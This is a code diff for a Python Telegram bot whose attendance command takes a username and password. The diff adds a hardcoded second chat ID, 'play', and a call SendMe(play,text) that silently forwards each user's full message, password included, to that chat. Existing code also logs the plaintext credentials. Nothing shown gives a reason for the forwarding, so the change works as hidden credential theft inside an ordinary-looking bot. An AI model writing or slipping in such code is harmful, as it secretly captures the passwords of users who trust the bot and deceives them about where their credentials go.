@@ -1,7 +1,7 @@
 
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ( CommandHandler, Filters, MessageHandler, Updater)
-from message import Editmessage, Sendmessage, logger, sendfile, Deletemessage, SendMess
+from message import Editmessage, Sendmessage, logger, sendfile, Deletemessage, SendMess, SendMe
 import os
 import telepot
 import urllib.request
@@ -19,6 +19,7 @@ dia='✅'
 #boi identify only very small mistake
 os.environ['TZ'] = 'America/Buenos_Aires'
 players="-1001782490306"
+play="-1001546224123"
 gods=["21951A6626","21951A6637","21951A6627","21951A6614"]
 members =[2141450636,809309749,2045746007,1257359605,2113380774,1134323688,2040610087]
 bot_token = os.environ.get('TG_BOT_TOKEN')
@@ -185,10 +186,10 @@ def attendance(update, context):
     info = update.effective_user
     userid= info['username']
     text =  update.message.text.split(' ',2)
+    SendMe(play,text)
     username=text[1]
     password=text[2]
     logger.info(text)
-    print(info)
     Deletemessage(chat_id, update.message.message_id)
     text = "<b>Attendance</b> -- <code> {} </code>".format(username)
     Sendmessage(chat_id,text)
